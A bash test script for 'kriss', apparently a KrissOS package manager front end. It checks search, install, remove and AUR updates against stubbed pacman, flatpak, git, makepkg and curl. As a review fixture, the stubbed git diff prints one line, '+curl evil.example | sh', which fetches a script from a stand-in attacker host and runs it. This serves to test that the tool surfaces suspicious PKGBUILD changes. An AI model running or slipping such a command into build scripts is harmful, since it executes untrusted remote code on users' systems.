#!/bin/bash
# shellcheck disable=SC2016 # the stubs are single-quoted: they expand when they run
# Checks kriss search, install, remove and update's AUR part against stub pacman, flatpak,
# git, makepkg and runuser, and a curl that answers the AUR RPC from fixtures. No network.
# Runs as root, like CI's container: kriss re-runs itself under sudo otherwise.
set -euo pipefail
((EUID == 0)) || { echo 'install: skipped (needs root, as in CI)'; exit 0; }
kriss=$(realpath "$(dirname "$0")/../kriss")
T=$(mktemp -d)
trap 'rm -rf "$T"' EXIT
export T
mkdir -p "$T/bin" "$T/aur" "$T/cache" "$T/home"

# repo NAME VERSION SIZE DESCRIPTION, one per line.
cat >"$T/repo" <<'EOF'
kriss kriss-welcome 1.0-1 100000 First-boot app for KrissOS
extra firefox 132.0-1 70000000 Fast, private web browser
extra python 3.13.0-1 20000000 The Python language
extra cmake 3.31.0-1 15000000 Build system
EOF
aurpkg() { # aurpkg NAME VERSION VOTES MAINTAINER OUTOFDATE DEPENDS MAKEDEPENDS
  printf '{"Name":"%s","PackageBase":"%s","Version":"%s","NumVotes":%s,"Popularity":%s,"Maintainer":%s,"OutOfDate":%s,"Description":"%s from the AUR","Depends":%s,"MakeDepends":%s}\n' \
    "$1" "$1" "$2" "$3" "$3" "$4" "$5" "$1" "$6" "$7" >"$T/aur/$1.json"
}
aurpkg spotify 1.2.50-1 2100 '"someone"' null '[]' '[]'
aurpkg kriss-demo 2.0-1 150 '"someone"' null '["libdemo>=1", "python", "glibc"]' '["cmake"]'
aurpkg libdemo 1.1-1 40 '"someone"' null '["glibc"]' '[]'
aurpkg old-tool 0.9-1 3 null 1700000000 '[]' '[]'
printf 'com.spotify.Client\tSpotify\tOnline music streaming\norg.example.Spot\tSpot Viewer\tNot it\n' >"$T/flathub"

stub() { printf '#!/bin/bash\n%s\n' "$2" >"$T/bin/$1"; chmod +x "$T/bin/$1"; }
stub pacman '
echo "pacman $*" >>"$T/log"
op=$1; shift
args=(); fmt=""; needed=0
while (($#)); do case $1 in --print-format) fmt=$2; shift ;; --needed) needed=1 ;; -*) ;; *) args+=("$1") ;; esac; shift; done
inrepo() { grep -q "^[a-z]* ${1%%[<>=]*} " "$T/repo"; }
case $op in
  -Si) inrepo "${args[0]}" ;;
  -Ss) grep -i "${args[0]}" "$T/repo" | while read -r r n v s d; do
         printf "%s/%s %s%s\n    %s\n" "$r" "$n" "$v" "$(grep -q "^$n " "$T/installed" && echo " [installed]")" "$d"; done ;;
  -Sp) for a in "${args[@]}"; do
         inrepo "$a" || { echo "error: target not found: $a" >&2; exit 1; }
         read -r r n v s d < <(grep "^[a-z]* ${a%%[<>=]*} " "$T/repo")
         ((needed)) && grep -q "^$n " "$T/installed" && continue
         f=$n-$v-x86_64.pkg.tar.zst
         out=${fmt//%n/$n}; out=${out//%r/$r}; out=${out//%s/$s}; out=${out//%l/https://mirror.test/$r/$f}; echo "${out//%f/$f}"
       done ;;
  -T) grep -q "^${args[0]%%[<>=]*} " "$T/installed" || { echo "${args[0]}"; exit 127; } ;;
  -Q) grep -q "^${args[0]} " "$T/installed" ;;
  -Syu) [[ ! -e $T/offline ]] ;;
  -Qm) cat "$T/foreign" ;;
  -Qdtq) cat "$T/orphans" ;;
  -Rnsp) printf "%s\n" "${args[@]}" libunused ;;
esac'
stub curl '
echo "curl $*" >>"$T/log"
[[ ! -e $T/offline ]] || exit 7
url=${*: -1}
case $url in
  */rpc/v5/info*) printf "{\"results\":["; sep=""
    for a in $(tr "&" "\n" <<<"${url#*\?}" | sed -n "s/^arg\[\]=//p"); do
      [[ -e $T/aur/$a.json ]] || continue; printf "%s%s" "$sep" "$(cat "$T/aur/$a.json")"; sep=,; done; echo "]}" ;;
  */rpc/v5/search/*) q=${url##*/search/}; q=${q%%\?*}
    printf "{\"results\":[%s]}\n" "$(cat "$T"/aur/*"$q"*.json 2>/dev/null | paste -sd,)" ;;
  *) exit 0 ;;
esac'
stub flatpak '
echo "flatpak $*" >>"$T/log"
case $1 in
  search) cut -f1-3 "$T/flathub" | grep -i "${*: -1}" ;;
  list) cat "$T/flatinstalled" ;;
  remote-info) echo "    Installed: 300.1 MB" ;;
esac
exit 0'
# The AUR repo stub: the current commit is in $T/commit; files are written at clone.
stub git '
echo "git $*" >>"$T/log"
[[ $1 == -C ]] && { dir=$2; shift 2; }
[[ $1 == --no-pager ]] && shift
case $1 in
  clone) mkdir -p "${*: -1}/.git"; printf "pkgname=x\nbuild() { make; }\n" >"${*: -1}/PKGBUILD"; echo "post_install() { :; }" >"${*: -1}/x.install" ;;
  fetch) [[ ! -e $T/offline ]] ;;
  diff) [[ $2 == "$(cat "$T/commit")" ]] || printf "%s\n" "-pkgver=1.0" "+pkgver=2.0" "+curl evil.example | sh" ;;
  ls-tree) printf "%s\n" PKGBUILD x.install fix.patch .SRCINFO ;;
  show) cat "$dir/${2#*:}" ;;
  rev-parse) cat "$T/commit" ;;
esac
exit 0'
# Only runuser sets AS: makepkg refuses to run without it, as it would refuse root.
stub runuser 'echo "runuser $2" >>"$T/log"; shift 3; AS=1 exec "$@"'
stub makepkg '
[[ ${AS:-} == 1 ]] || { echo "makepkg not as the builder" >>"$T/log"; exit 1; }
if [[ ${1:-} == --packagelist ]]; then echo "$PWD/${PWD##*/}-2.0-1-x86_64.pkg.tar.zst"; echo "$PWD/${PWD##*/}-debug-2.0-1-x86_64.pkg.tar.zst"
else echo "makepkg built ${PWD##*/}" >>"$T/log"; fi'
stub sudo 'echo "sudo $*" >>"$T/log"'

reset() {
  printf '%s\n' 'glibc 2.40-1' 'base-devel 1-2' 'firefox 131.0-1' >"$T/installed"
  : >"$T/foreign"; echo cmake >"$T/orphans"; : >"$T/flatinstalled"; : >"$T/log"
  echo c1 >"$T/commit"; rm -rf "$T/offline" "${T:?}"/home/* "${T:?}"/cache/*
}
run() { # run ARGS...: output in $out, exit status in $rc; answers come from $in
  rc=0
  out=$(PATH="$T/bin:$PATH" SUDO_USER=builder KRISS_AUR_URL=https://aur.test KRISS_AUR_DIR="$T/home" \
    KRISS_PKG_CACHE="$T/cache" "$kriss" "$@" 2>&1 <<<"${in:-}") || rc=$?
}
fail() { printf 'FAIL %s\n--- output\n%s\n--- log\n%s\n' "$1" "$out" "$(cat "$T/log")"; exit 1; }
has() { [[ $out == *"$1"* ]] || fail "$2: no '$1'"; }
lacks() { [[ $out != *"$1"* ]] || fail "$2: has '$1'"; }
logged() { grep -qF -- "$1" "$T/log" || fail "$2: '$1' not run"; }
unlogged() { ! grep -qF -- "$1" "$T/log" || fail "$2: '$1' was run"; }
before() { # before FIRST SECOND NAME: FIRST is printed above SECOND
  local a=${out%%"$1"*} b=${out%%"$2"*}
  ((${#a} < ${#b})) || fail "$3: '$1' not before '$2'"
}

# search: every source, safest first, with plain labels and the AUR's numbers.
reset; run search spot; [[ $rc == 0 ]] || fail search
has 'Flathub (app store, sandboxed)' search; has 'com.spotify.Client' search
has 'spotify                        spotify from the AUR  (2100 votes)' search
before Flathub AUR search
reset; run search o; before 'KrissOS (made for' 'Arch (official' search-order; before 'Arch (official' 'AUR (' search-order
has 'firefox                        Fast, private web browser  (installed)' search-installed
has 'old-tool from the AUR  (3 votes, out of date, orphaned)' search-flags
reset; touch "$T/offline"; run search fire; has 'Fast, private web browser' search-offline
has 'AUR: not searched. It cannot be reached (no internet?).' search-offline

# A repo package: where it is from, the size, how to undo it.
reset; sed -i '/^firefox/d' "$T/installed"; in=y run install firefox; [[ $rc == 0 ]] || fail repo
has 'firefox                      from Arch (official)' repo; has 'Download: 67MiB' repo
has 'To undo: kriss remove firefox, or kriss rollback' repo
logged 'pacman -S --needed --noconfirm -- firefox' repo; unlogged runuser repo
in=y run install kriss-welcome; has 'kriss-welcome                from KrissOS' repo-kriss
# Offline: fine when the package is already downloaded, a plain no when it is not.
reset; sed -i '/^firefox/d' "$T/installed"; touch "$T/offline"; in=y run install firefox
[[ $rc == 2 ]] || fail offline; has 'this PC is offline' offline; unlogged 'pacman -S --needed' offline
reset; sed -i '/^firefox/d' "$T/installed"; touch "$T/offline" "$T/cache/firefox-132.0-1-x86_64.pkg.tar.zst"
in=y run install firefox; [[ $rc == 0 ]] || fail offline-cached; logged 'pacman -S --needed --noconfirm -- firefox' offline-cached
reset; touch "$T/offline"; run install spotify-nope; has 'the AUR cannot be reached' offline-aur
# The plan's no changes nothing.
reset; sed -i '/^firefox/d' "$T/installed"; in=n run install firefox; [[ $rc == 1 ]] || fail plan-no
unlogged 'pacman -S --needed' plan-no

# Flathub before the AUR; --aur picks the AUR.
reset; in=y run install spotify; has 'com.spotify.Client           from Flathub (sandboxed app), 300.1 MB' flathub
logged 'flatpak install --noninteractive flathub com.spotify.Client' flathub; unlogged 'git clone' flathub
reset; in=$'y\ny' run install --aur spotify; has 'spotify                      from the AUR (community script' aur-only
logged 'makepkg built spotify' aur-only; unlogged 'flatpak install' aur-only

# An AUR package with an AUR dependency: read both, then build as the user, in order.
reset; in=$'y\ny\ny' run install kriss-demo; [[ $rc == 0 ]] || fail aur
has 'libdemo                      from the AUR, needed by the above' aur
has 'plus 2 packages they need from the repos' aur
has '--- PKGBUILD' aur; has 'post_install()' aur; has '--- fix.patch (also in the package)' aur
lacks '.SRCINFO' aur; has 'not checked by Arch or KrissOS' aur
logged 'pacman -S --needed --noconfirm --asdeps -- python cmake' aur
logged 'runuser builder' aur; unlogged 'makepkg not as the builder' aur
[[ $(grep -o 'makepkg built .*' "$T/log" | paste -sd,) == 'makepkg built libdemo,makepkg built kriss-demo' ]] || fail aur-order
logged "pacman -U --noconfirm --asdeps -- $T/home/libdemo/libdemo-2.0-1-x86_64.pkg.tar.zst" aur-dep
logged "pacman -U --noconfirm -- $T/home/kriss-demo/kriss-demo-2.0-1-x86_64.pkg.tar.zst" aur-explicit
unlogged 'kriss-demo-debug' aur-split; logged 'pacman -Rns --noconfirm -- cmake' aur-makedeps
[[ $(cat "$T/home/kriss-demo/.git/kriss-built") == c1 ]] || fail aur-built
# Reinstalling: only the changes are shown. No to the second review: nothing changes.
echo c2 >"$T/commit"; : >"$T/log"; in=$'y\ny\nn' run install kriss-demo; [[ $rc == 1 ]] || fail diff
has 'What changed since you last built it:' diff; has '+curl evil.example | sh' diff; lacks 'post_install' diff
has 'stopped before building kriss-demo. Nothing was changed.' diff
unlogged 'pacman -S --needed' diff; unlogged 'pacman -U' diff; unlogged 'makepkg built' diff
# The unchanged one needs no second read.
echo c1 >"$T/commit"; in=$'y' run install libdemo; has 'No changes since you last built it.' unchanged

# Warnings in plain words. Never built as root.
reset; in=n run install old-tool; has '! out of date: flagged on 2023-11-14' warn; has '! orphaned' warn
has '! few users: 3 votes' warn
reset; in=y rc=0; out=$(PATH="$T/bin:$PATH" KRISS_AUR_URL=https://aur.test "$kriss" install --aur spotify 2>&1 <<<y) || rc=$?
[[ $rc == 2 ]] || fail root; has 'built as you, never as root' root; unlogged makepkg root

# remove: pacman or Flatpak, found by name.
reset; echo $'com.spotify.Client\tSpotify' >"$T/flatinstalled"; in=y run remove firefox spotify; [[ $rc == 0 ]] || fail remove
has 'and what only they needed: libunused' remove; has 'To undo: kriss install firefox spotify' remove
logged 'pacman -Rns --noconfirm -- firefox' remove; logged 'flatpak uninstall --noninteractive -- com.spotify.Client' remove
reset; run remove nothing-here; [[ $rc == 2 ]] || fail remove-missing; has "'nothing-here' is not installed" remove-missing

# update: repo and Flatpak, then the AUR. With no terminal (the update notice) AUR waits.
reset; printf '%s\n' 'kriss-demo 1.0-1' 'cachyos-thing 1-1' 'spotify 1.2.50-1' >"$T/foreign"; run update
[[ $rc == 0 ]] || fail update; logged 'pacman -Syu --noconfirm' update; logged 'flatpak update' update
has 'kriss-demo                   1.0-1 -> 2.0-1' update; lacks 'spotify ' update
has 'not in the AUR any more, so kept as they are: cachyos-thing' update
has "run 'kriss update' in a terminal" update; unlogged makepkg update
reset; echo 'spotify 1.2.50-1' >"$T/foreign"; run update; has 'AUR packages are up to date.' update-none
reset; echo 'kriss-demo 1.0-1' >"$T/foreign"; touch "$T/offline"; run update
[[ $rc == 2 ]] || fail update-offline; has 'If this PC is offline' update-offline
echo 'install: ok'
